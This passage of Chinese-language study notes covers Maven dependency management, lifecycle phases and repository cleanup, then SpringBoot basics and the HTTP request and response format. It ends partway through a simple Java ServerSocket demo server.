<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 第1个依赖 : logback --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 第2个依赖 : junit --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>刷新按钮，引入最新加入的坐标</p>
<blockquote>
<p>注意事项：</p>
<ol>
<li>如果引入的依赖，在本地仓库中不存在，将会连接远程仓库 / 中央仓库，然后下载依赖（这个过程会比较耗时，耐心等待）</li>
<li>如果不知道依赖的坐标信息，可以到mvn的中央仓库（<a href="https://mvnrepository.com/%EF%BC%89%E4%B8%AD%E6%90%9C%E7%B4%A2">https://mvnrepository.com/）中搜索</a></li>
</ol>
</blockquote>
</li>
</ul>
<h4 id="添加依赖的几种方式"><a class="header-anchor" href="#添加依赖的几种方式">¶</a>添加依赖的几种方式</h4>
<ol>
<li>利用<a href="https://mvnrepository.com/">中央仓库</a>搜索的依赖坐标</li>
<li>利用IDEA工具搜索依赖</li>
</ol>
<h4 id="依赖传递"><a class="header-anchor" href="#依赖传递">¶</a>依赖传递</h4>
<ul>
<li>早期没有maven时：向项目中添加依赖的jar包，把所有的jar包复制到项目工程下（/llib路径下）</li>
<li>有了maven后：只需要在pom.xml配置文件中，添加依赖坐标即可
<ul>
<li>由于maven的依赖具有传递性，所以会<u>自动把所依赖的其他jar包也一起导入</u></li>
</ul>
</li>
</ul>
<h5 id="依赖传递的分类"><a class="header-anchor" href="#依赖传递的分类">¶</a>依赖传递的分类</h5>
<ul>
<li>分为<u>直接依赖</u>和<u>间接依赖</u></li>
<li><u>直接依赖</u>：
<ul>
<li>例如projectA依赖了projectB。对于projectA 来说，projectB 就是直接依赖</li>
</ul>
</li>
<li><u>间接依赖</u>：
<ul>
<li>projectB依赖了projectC及其他jar包</li>
<li>则在projectA中也会将projectC的依赖传递下来</li>
<li>对于projectA 来说，projectC就是间接依赖</li>
</ul>
</li>
</ul>
<h5 id="排除依赖"><a class="header-anchor" href="#排除依赖">¶</a>排除依赖</h5>
<ul>
<li>例如：A依赖B，B依赖C，想让A不依赖C→<strong>排除依赖</strong></li>
<li>排除依赖：指主动断开依赖的资源。（被排除的资源无需指定版本）</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.itheima<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-projectB<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--排除依赖, 主动断开依赖的资源--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="依赖范围"><a class="header-anchor" href="#依赖范围">¶</a>依赖范围</h4>
<ul>
<li>
<p>在<code>pom.xml</code>中导入的依赖，在<code>main</code>和<code>test</code>文件夹范围内都可以使用</p>
</li>
<li>
<p><u>希望限制使用范围</u>：使用<code>使用&lt;scope&gt;标签</code>设置其作用范围</p>
</li>
<li>
<p>作用范围：</p>
<ol>
<li>主程序范围有效（main文件夹范围内）</li>
<li>测试程序范围有效（test文件夹范围内）</li>
<li>是否参与打包运行（package指令范围内）</li>
</ol>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    	<span class="comment">&lt;!-- 设置作用范围：仅测试环境有效（只能在test文件夹范围内使用） --&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="生命周期"><a class="header-anchor" href="#生命周期">¶</a>生命周期</h4>
<h5 id="生命周期的介绍"><a class="header-anchor" href="#生命周期的介绍">¶</a>生命周期的介绍</h5>
<ul>
<li>
<p>Maven的生命周期就是为了对所有的构建过程进行抽象和统一。 描述了一次项目构建，经历哪些阶段</p>
</li>
<li>
<p>Maven的生命周期包括：项目的清理，初始化，编译，测试，打包，集成测试，验证，部署和站点生成等几乎所有构建步骤。</p>
</li>
<li>
<p>Maven对项目构建的生命周期划分为3套（相互独立）：<code>clean</code>  <code>default</code>  <code>site</code></p>
<ul>
<li><code>clean</code>：清理工作</li>
<li><code>default</code>：核心工作。如：编译、测试、打包、安装、部署等</li>
<li><code>site</code>：生成报告、发布站点等</li>
</ul>
</li>
<li>
<p>常用的几个生命周期阶段：</p>
<ul>
<li><code>clean</code>：移除上一次构建生成的文件</li>
<li><code>compile</code>：编译项目源代码</li>
<li><code>test</code>：使用合适的单元测试框架运行测试(junit)</li>
<li><code>package</code>：将编译后的文件打包，如：jar、war等</li>
<li><code>install</code>：安装项目到本地仓库</li>
</ul>
</li>
<li>
<p>Maven的生命周期是<strong>抽象</strong>的，这意味着生命周期本身不做任何实际工作</p>
<ul>
<li><strong>在Maven的设计中，实际任务（如源代码编译）都交由插件来完成</strong></li>
<li>IDEA右侧的Maven工具栏：maven生命周期的快速访问通道</li>
</ul>
</li>
<li>
<p>生命周期的顺序是：</p>
<ul>
<li><code>clean --&gt; validate --&gt; compile --&gt; test --&gt; package --&gt; verify --&gt; install --&gt; site --&gt; deploy </code></li>
</ul>
</li>
<li>
<p>需要关注的：</p>
</li>
<li>
<p><code>clean --&gt;  compile --&gt; test --&gt; package  --&gt; install </code></p>
</li>
<li>
<p>注意：</p>
<ul>
<li>在同一套生命周期中，我们在执行后面的生命周期时，前面的生命周期都会执行</li>
</ul>
<blockquote>
<p>思考：当运行package生命周期时，clean、compile生命周期会不会运行？</p>
<p>​               → clean不会运行，compile会运行。  因为compile与package属于同一套生命周期，而clean与package不属于同一套生命周期。</p>
</blockquote>
</li>
</ul>
<h5 id="生命周期的执行"><a class="header-anchor" href="#生命周期的执行">¶</a>生命周期的执行</h5>
<h6 id="两种执行方式"><a class="header-anchor" href="#两种执行方式">¶</a>两种执行方式</h6>
<ul>
<li>
<p>方式一：在idea工具右侧的maven工具栏中，选择对应的生命周期，双击执行</p>
</li>
<li>
<p><strong>compile</strong>:</p>
<ul>
<li>方式①：双击Lifecycle中的compile</li>
<li>方式②：点击Maven界面绿色三角</li>
<li>只针对<code>main</code>文件夹范围内的源代码进行编译</li>
<li>编译后生成<code>target</code>目录</li>
</ul>
</li>
<li>
<p><strong>test</strong>:</p>
<ul>
<li>只针对<code>test</code>文件夹范围内的源代码进行编译</li>
<li>编译后生成测试类的字节码文件</li>
</ul>
</li>
<li>
<p><strong>package</strong>：</p>
<ul>
<li>以项目名+版本号，作为打包后<code>jar</code>文件的名字</li>
<li>打包后生成的<code>jar</code>文件，存放在<code>target</code>目录下</li>
</ul>
</li>
<li>
<p><strong>install</strong>：</p>
<ul>
<li>把jar文件安装在指定坐标路径下</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定坐标路径：junit/junit/4.12 --&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>clean</strong>：</p>
<ul>
<li>删除<code>target</code>目录</li>
</ul>
</li>
<li>
<p>方式二：在DOS命令行中，通过maven命令执行</p>
</li>
</ul>
<ol>
<li>进入DOS命令行
<ol>
<li>按住Shift + 鼠标右键 打开Powershell 【我趣这招快啊】</li>
<li>在项目路径下，使用命令行：<code>mvn clean / compile / test / package / install</code> 完成对应操作</li>
</ol>
</li>
</ol>
<h5 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h5>
<h5 id="更新依赖索引"><a class="header-anchor" href="#更新依赖索引">¶</a>更新依赖索引</h5>
<ul>
<li>配置完maven仓库信息后，在idea中依然搜索不到仓库中的jar包→
<ul>
<li>更新idea中maven的索引</li>
<li><code>打开设置----搜索maven----Repositories----选中本地仓库-----点击Update</code></li>
</ul>
</li>
</ul>
<h5 id="清理maven仓库"><a class="header-anchor" href="#清理maven仓库">¶</a>清理maven仓库</h5>
<ul>
<li>
<p>下载不完全的jar包→以lastUpdated结尾</p>
</li>
<li>
<p>需要手动删除这些以lastUpdated结尾的文件，然后maven才会再次自动下载这些jar包</p>
</li>
<li>
<p>如果本地仓库中有很多这样的以lastUpadted结尾的文件，可以定义一个批处理文件，在其中编写如下脚本来删除</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> REPOSITORY_PATH=E:\develop\apache-maven-3.6.1\mvn_repo</span><br><span class="line">rem 正在搜索...</span><br><span class="line"></span><br><span class="line">del /s /q %REPOSITORY_PATH%\*.lastUpdated</span><br><span class="line"></span><br><span class="line">rem 搜索完毕</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
<ul>
<li>操作步骤
<ul>
<li>定义批处理文件del_lastUpdated.bat  (直接创建一个文本文件，命名为del_lastUpdated，后缀名直接改为bat即可 )</li>
<li>右键点击bat文件并编辑<code>set REPOSITORY_PATH=E:\develop\apache-maven-3.6.1\mvn_repo</code>，将PATH后面改为本地仓库的地址</li>
<li>修改完毕后，双击脚本即可删除maven仓库中的残留文件</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="SpringBootWeb"><a class="header-anchor" href="#SpringBootWeb">¶</a>SpringBootWeb</h3>
<blockquote>
<ol>
<li>SpringBootWeb入门</li>
<li>HTTP协议</li>
<li>Web服务器-Tomcat</li>
</ol>
</blockquote>
<h4 id="Spring全家桶"><a class="header-anchor" href="#Spring全家桶">¶</a>Spring全家桶</h4>
<ul>
<li>
<p>Spring提供了若干个子项目，每个项目用于完成特定的功能</p>
</li>
<li>
<p>在项目开发时，一般会偏向选择spring家族的技术，来解决对应领域的问题</p>
</li>
<li>
<p>最基础、最核心： SpringFramework</p>
<ul>
<li>其他的spring家族的技术，都是基于SpringFramework</li>
<li>SpringFramework中提供很多实用功能，如：<code>依赖注入</code>、<code>事务管理</code>、<code>web开发支持</code>、<code>数据访问</code>、<code>消息服务</code>等等</li>
<li>但是SpringFramework配置繁琐+入门难度大，所以推荐从简化配置、快速开发的Spring Boot入手</li>
</ul>
</li>
</ul>
<h4 id="SpringBoot快速入门"><a class="header-anchor" href="#SpringBoot快速入门">¶</a>SpringBoot快速入门</h4>
<ul>
<li>第1步：创建SpringBoot工程项目</li>
<li>第2步：定义HelloController类，添加方法hello，并添加注解</li>
<li>第3步：测试运行</li>
</ul>
<h5 id="Web分析"><a class="header-anchor" href="#Web分析">¶</a>Web分析</h5>
<ul>
<li>
<p>输入网址：</p>
<ul>
<li>通过IP地址<code>192.168.100.11</code>定位到网络上的一台计算机</li>
</ul>
<blockquote>
<p>在浏览器中输入localhost，就是127.0.0.1（本机）</p>
</blockquote>
<ul>
<li>​	通过端口号8080找到计算机上运行的程序</li>
</ul>
<blockquote>
<p><code>localhost:8080</code>  ,在本地中找到正在运行的8080端口的程序</p>
</blockquote>
<ul>
<li>
<p><code>/hello</code>是请求资源位置</p>
<ul>
<li>资源：对于计算机而言资源就是数据
<ul>
<li><code>web资源</code>：通过网络可以访问到的数据（通常指存放在服务器上的数据）</li>
</ul>
</li>
</ul>
<blockquote>
<p><code>localhost:8080/hello</code> ，意思是向本地计算机中的8080端口程序，获取资源位置是/hello的数据</p>
</blockquote>
<ul>
<li>8080端口程序，在服务器寻找<code>/hello</code>位置的资源数据，发送给浏览器</li>
</ul>
</li>
</ul>
</li>
<li>
<p>服务器：（可理解为ServerSocket）</p>
<ul>
<li>接收浏览器发送的信息（如：/hello）</li>
<li>在服务器上找到<code>/hello</code>的资源</li>
<li>把资源发送给浏览器</li>
</ul>
<blockquote>
<p>网络三要素：</p>
<ul>
<li>IP：网络中计算机的唯一标识</li>
<li>端口：计算机中运行程序的唯一标识</li>
<li>协议：网络中计算机之间交互的规则
<ul>
<li>浏览器和服务器两端进行数据交互，使用http协议</li>
</ul>
</li>
</ul>
</blockquote>
</li>
</ul>
<h4 id="HTTP协议"><a class="header-anchor" href="#HTTP协议">¶</a>HTTP协议</h4>
<h5 id="HTTP协议介绍"><a class="header-anchor" href="#HTTP协议介绍">¶</a>HTTP协议介绍</h5>
<ul>
<li>
<p><code>HTTP</code>：Hyper Text Transfer Protocol(超文本传输协议)，规定了<strong>浏览器</strong>与<strong>服务器</strong>之间数据传输的规则</p>
</li>
<li>
<p>http协议要求：<u>浏览器在向服务器发送请求数据</u>时，或是<u>服务器在向浏览器发送响应数据</u>时，都必须<u>按照固定的格式</u>进行数据传输</p>
</li>
<li>
<p>查看http协议的数据传输格式：</p>
<ul>
<li>浏览器按<code>F12</code>打开开发者工具→点击<code>网络/Network</code>→双击资源包查看Http协议固定格式</li>
</ul>
</li>
<li>
<p>浏览器向服务器进行请求时：2.2.1.1</p>
<ul>
<li>
<p>服务器按照固定的格式进行解析</p>
<blockquote>
<p>请求行</p>
<p>……</p>
<p>请求头</p>
<p>请求头是以&quot;Key: value&quot;形式体现的</p>
<p>Key是固定名字</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>服务器向浏览器进行响应时</p>
<ul>
<li>
<p>浏览器按照固定的格式进行解析</p>
<blockquote>
<p>响应行</p>
<p>……</p>
<p>响应头</p>
<p>响应头是以&quot;Key: value&quot;形式体现的</p>
<p>Key是固定名字</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><strong><u>学习HTTP主要就是学习请求和响应数据的具体格式内容</u></strong></p>
</li>
</ul>
<h5 id="HTTP协议特点"><a class="header-anchor" href="#HTTP协议特点">¶</a>HTTP协议特点</h5>
<ul>
<li>
<p><strong><u>基于TCP协议</u></strong>：面向连接，安全</p>
<blockquote>
<p>TCP是一种面向连接的(建立连接之前是需要经过三次握手)、可靠的、基于字节流的传输层通信协议，在数据传输方面更安全</p>
</blockquote>
</li>
<li>
<p><strong><u>基于请求-响应模型</u></strong>：一次请求对应一次响应，先请求后响应</p>
<blockquote>
<p>请求和响应是一一对应关系，没有请求，就没有响应</p>
</blockquote>
</li>
<li>
<p><strong><u>HTTP协议是无状态协议</u></strong>：对于数据没有记忆能力，每次请求-响应都是独立的</p>
<blockquote>
<p>指的是客户端发送HTTP请求给服务端之后，服务端根据请求响应数据，响应完后，不会记录任何信息。</p>
<ul>
<li>缺点:  多次请求间不能共享数据</li>
<li>优点:  速度快</li>
</ul>
<p>请求之间无法共享数据会引发的问题：</p>
<ul>
<li>如：京东购物。加入购物车和去购物车结算是两次请求</li>
<li>由于HTTP协议的无状态特性，加入购物车请求响应结束后，并未记录加入购物车是何商品</li>
</ul>
<p>解决：使用会话技术(Cookie、Session)来解决这个问题</p>
</blockquote>
</li>
</ul>
<h5 id="HTTP-请求协议-2-2-2"><a class="header-anchor" href="#HTTP-请求协议-2-2-2">¶</a>HTTP-请求协议 2.2.2</h5>
<ul>
<li>
<p>HTTP协议分为：<strong><u>请求协议</u><strong>和</strong><u>响应协议</u></strong></p>
</li>
<li>
<p><strong><u>请求协议</u></strong>：浏览器将数据以请求格式发送到服务器</p>
<ul>
<li>包括：<strong>请求行</strong>、<strong>请求头</strong>、<strong>请求体</strong></li>
</ul>
</li>
<li>
<p><strong><u>响应协议</u></strong>：服务器将数据以响应格式返回给浏览器</p>
</li>
<li>
<p>包括：<strong>响应行</strong>、<strong>响应头</strong>、<strong>响应体</strong></p>
</li>
<li>
<p>浏览器访问服务器的几种方式</p>
<table>
<thead>
<tr>
<th>请求方式</th>
<th>请求说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>获取资源。<br>向特定的资源发出请求。例：<a href="http://www.baidu.com/s?wd=itheima">http://www.baidu.com/s?wd=itheima</a></td>
</tr>
<tr>
<td>POST</td>
<td>传输实体主体。<br>向指定资源提交数据进行处理请求（例：上传文件），数据被包含在请求体中。</td>
</tr>
<tr>
<td></td>
<td>还有OPTIONS、HEAD、PUT、DELETE、TRACE、CONNECT几种方式</td>
</tr>
</tbody>
</table>
</li>
</ul>
<h6 id="GET方式的请求协议"><a class="header-anchor" href="#GET方式的请求协议">¶</a>GET方式的请求协议</h6>
<ul>
<li>
<p><strong><u>请求行</u></strong> ：HTTP请求中的第一行数据。</p>
</li>
<li>
<p>由：<code>请求方式</code>、<code>资源路径</code>、<code>协议/版本</code>组成（之间使用空格分隔）</p>
<ul>
<li>请求方式：GET</li>
<li>资源路径：/brand/findAll?name=OPPO&amp;status=1
<ul>
<li>请求路径：/brand/findAll</li>
<li>请求参数：name=OPPO&amp;status=1
<ul>
<li>请求参数是以key=value形式出现</li>
<li>多个请求参数之间使用<code>&amp;</code>连接
<ul>
<li>请求路径和请求参数之间使用<code>?</code>连接</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>协议/版本：HTTP/1.1</li>
</ul>
</li>
<li>
<p><strong><u>请求头</u></strong> ：第二行开始，格式为<code>key: value</code>形式</p>
<ul>
<li>http是个无状态的协议，所以在请求头设置浏览器的一些自身信息和想要响应的形式。</li>
<li>这样服务器在收到信息后，就可以知道是谁，想干什么了</li>
</ul>
</li>
<li>
<p><strong><u>常见HTTP请求头</u></strong></p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Host: 表示请求的主机名</span><br><span class="line"></span><br><span class="line">User-Agent: 浏览器版本。 例如：Chrome浏览器的标识类似Mozilla/5.0 ...Chrome/79 ，IE浏览器的标识类似Mozilla/5.0 (Windows NT ...)like Gecko</span><br><span class="line"></span><br><span class="line">Accept：表示浏览器能接收的资源类型，如text/*，image/*或者*/*表示所有</span><br><span class="line"></span><br><span class="line">Accept-Language：表示浏览器偏好的语言，服务器可以据此返回不同语言的网页</span><br><span class="line"></span><br><span class="line">Accept-Encoding：表示浏览器可以支持的压缩类型，例如gzip, deflate等</span><br><span class="line"></span><br><span class="line">Content-Type：请求主体的数据类型</span><br><span class="line"></span><br><span class="line">Content-Length：数据主体的大小（单位：字节）</span><br></pre></td></tr></table></figure>
<blockquote>
<p>举例说明：服务端可以根据请求头中的内容来获取客户端的相关信息，有了这些信息服务端就可以处理不同的业务需求。</p>
<p>比如:</p>
<ul>
<li>不同浏览器解析HTML和CSS标签的结果会有不一致，所以就会导致相同的代码在不同的浏览器会出现不同的效果</li>
<li>服务端根据客户端请求头中的数据获取到客户端的浏览器类型，就可以根据不同的浏览器设置不同的代码来达到一致的效果（浏览器兼容问题）</li>
</ul>
</blockquote>
<ul>
<li><strong><u>请求体</u></strong>：存储请求参数
<ul>
<li>GET请求的请求参数在请求行中，故不需要设置请求体</li>
</ul>
</li>
</ul>
<h6 id="POST方式的请求协议"><a class="header-anchor" href="#POST方式的请求协议">¶</a>POST方式的请求协议</h6>
<ul>
<li><strong><u>请求行</u></strong>：包含请求方式、资源路径、协议/版本
<ul>
<li>请求方式：POST</li>
<li>资源路径：/brand</li>
<li>协议/版本：HTTP/1.1</li>
</ul>
</li>
<li><strong><u>请求头</u></strong></li>
<li><strong><u>请求体</u></strong>：存储请求参数
<ul>
<li>请求体和请求头之间是有一个空行隔开</li>
<li>作用：用于标记请求头结束</li>
</ul>
</li>
</ul>
<h6 id="GET请求和POST请求的区别"><a class="header-anchor" href="#GET请求和POST请求的区别">¶</a>GET请求和POST请求的区别</h6>
<table>
<thead>
<tr>
<th>区别方式</th>
<th>GET请求</th>
<th>POST请求</th>
</tr>
</thead>
<tbody>
<tr>
<td>请求参数</td>
<td>请求参数在请求行中。<br>例：/brand/findAll?name=OPPO&amp;status=1</td>
<td>请求参数在请求体中</td>
</tr>
<tr>
<td>请求参数长度</td>
<td>请求参数长度有限制(浏览器不同限制也不同)</td>
<td>请求参数长度没有限制</td>
</tr>
<tr>
<td>安全性</td>
<td>安全性低。原因：请求参数暴露在浏览器地址栏中。</td>
<td>安全性相对高</td>
</tr>
</tbody>
</table>
<h5 id="HTTP-响应协议"><a class="header-anchor" href="#HTTP-响应协议">¶</a>HTTP-响应协议</h5>
<ul>
<li>HTTP响应的数据也分为3部分：<strong>响应行</strong>、<strong>响应头</strong> 、<strong>响应体</strong></li>
<li>响应行：响应数据的第一行。
<ul>
<li>响应行由<code>协议及版本</code>、<code>响应状态码</code>、<code>状态码描述</code>组成</li>
<li>协议/版本：HTTP/1.1</li>
<li>响应状态码：200</li>
<li>状态码描述：OK</li>
</ul>
</li>
<li>响应头：响应数据的第二行开始。
<ul>
<li>格式为key：value形式</li>
<li>http是个无状态的协议，所以可以在请求头和响应头中设置一些信息和想要执行的动作，这样对方在收到信息后，就可以知道你是谁，你想干什么</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type：表示该响应内容的类型，例如text/html，image/jpeg ；</span><br><span class="line"></span><br><span class="line">Content-Length：表示该响应内容的长度（字节数）；</span><br><span class="line"></span><br><span class="line">Content-Encoding：表示该响应压缩算法，例如gzip ；</span><br><span class="line"></span><br><span class="line">Cache-Control：指示客户端应如何缓存，例如max-age=300表示可以最多缓存300秒 ;</span><br><span class="line"></span><br><span class="line">Set-Cookie: 告诉浏览器为当前页面所在的域设置cookie ;</span><br></pre></td></tr></table></figure>
<ul>
<li>响应体： 响应数据的最后一部分。存储响应的数据
<ul>
<li>响应体和响应头之间有一个空行隔开</li>
<li>作用：用于标记响应头结束</li>
</ul>
</li>
</ul>
<h6 id="响应状态码"><a class="header-anchor" href="#响应状态码">¶</a>响应状态码</h6>
<ul>
<li>
<p>1xx</p>
<blockquote>
<p>响应中 — 临时状态码。表示请求已经接受，告诉客户端应该继续请求或者如果已经完成则忽略</p>
</blockquote>
</li>
<li>
<p>2xx</p>
<blockquote>
<p>成功 — 表示请求已经被成功接收，处理已完成</p>
</blockquote>
</li>
<li>
<p>3xx</p>
<blockquote>
<p>重定向 — 重定向到其它地方，让客户端再发起一个请求以完成整个处理</p>
</blockquote>
</li>
<li>
<p>4xx</p>
<blockquote>
<p>客户端错误 — 处理发生错误，责任在客户端，如：客户端的请求一个不存在的资源，客户端未被授权，禁止访问等</p>
</blockquote>
</li>
<li>
<p>5xx</p>
<blockquote>
<p>服务器端错误 — 处理发生错误，责任在服务端，如：服务端抛出异常，路由出错，HTTP版本不支持等</p>
</blockquote>
</li>
<li>
<p>需要认识的：</p>
<ul>
<li><code>200</code>    ok   客户端请求成功</li>
<li><code>404</code>  Not Found  请求资源不存在</li>
<li><code>500</code>  Internal Server Error  服务端发生不可预期的错误</li>
</ul>
</li>
</ul>
<h5 id="HTTP-协议解析"><a class="header-anchor" href="#HTTP-协议解析">¶</a>HTTP-协议解析</h5>
<ul>
<li>Demo工程中有一个<code>Server.java</code>类</li>
<li>主要用到：<code>ServerSocket</code>和<code>Socket</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">package com.itheima;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.net.ServerSocket;</span><br><span class="line">import java.net.Socket;</span><br><span class="line">import java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">自定义web服务器</span><br><span class="line">*/</span><br><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">		// 浏览器输入：http://localhost:8080  就会访问到ServerSocket程序</span><br><span class="line">        ServerSocket ss = new ServerSocket(8080); // 监听指定端口</span><br><span class="line"></span><br><span class="line">		/*</span><br><span class="line">		- ServerSocket程序，会读取服务器上html/a.html文件，并把文件数据发送给浏览器</span><br><span class="line">		- 浏览器接收到a.html文件中的数据后进行解析，显示网页内容</span><br><span class="line">		*/</span><br><span class="line">        System.out.println(&quot;server is running...&quot;);</span><br><span class="line"></span><br><span class="line">        while (true)&#123;</span><br><span class="line">            Socket sock = ss.accept();</span><br><span class="line">            System.out.println(&quot;connected from &quot; + sock.getRemoteSocketAddress());</span><br><span class="line">            Thread t = new Handler(sock);</span><br><span class="line">            t.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Handler extends Thread &#123;</span><br><span class="line">    Socket sock;</span><br><span class="line"></span><br><span class="line">    public Handler(Socket sock) &#123;</span><br><span class="line">        this.sock = sock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void run() &#123;</span><br><span class="line">        try (InputStream input = this.sock.getInputStream();</span><br><span class="line">             OutputStream output = this.sock.getOutputStream()) &#123;</span><br><span class="line">                handle(input, output);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                this.sock.close();</span><br><span class="line">            &#125; catch (IOException ioe) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(&quot;client disconnected.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void handle(InputStream input, OutputStream output) throws IOException &#123;</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(input, StandardCharsets.UTF_8));</span><br><span class="line">        BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(output, StandardCharsets.UTF_8));</span><br><span class="line">        // 读取HTTP请求:</span><br><span class="line">        boolean requestOk = false;</span><br><span class="line">        String first = reader.readLine();</span><br><span class="line">        if (first.startsWith(&quot;GET / HTTP/1.&quot;)) &#123;</span><br><span class="line">            requestOk = true;</span><br><span class="line">        &#125;</span><br><span class="line">        for (;;) &#123;</span><br><span class="line">            String header = reader.readLine();</span><br><span class="line">            if (header.isEmpty()) &#123; // 读取到空行时, HTTP Header读取完毕</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(header);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(requestOk ? &quot;Response OK&quot; : &quot;Response Error&quot;);</span><br><span class="line"></span><br><span class="line">        if (!requestOk) &#123;// 发送错误响应:</span><br><span class="line">            writer.write(&quot;HTTP/1.0 404 Not Found\r\n&quot;);</span><br><span class="line">            writer.write(&quot;Content-Length: 0\r\n&quot;);</span><br><span class="line">            writer.write(&quot;\r\n&quot;);</span><br><span class="line">            writer.flush();</span><br><span class="line">        &#125; else &#123;// 发送成功响应:</span><br><span class="line">            //读取html文件，转换为字符串</span><br><span class="line">            InputStream is = Server.class.getClassLoader().getResourceAsStream(&quot;html/a.html&quot;);</span><br><span class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(is));</span><br><span class="line">            StringBuilder data = new StringBuilder();</span><br><span class="line">            String line = null;</span><br><span class="line">            while ((line = br.readLine()) != null)&#123;</span><br><span class="line">                data.append(line);</span><br><span class="line">            &#125;</span><br><span class="line">            br.close();</span><br><span class="line">            int length = 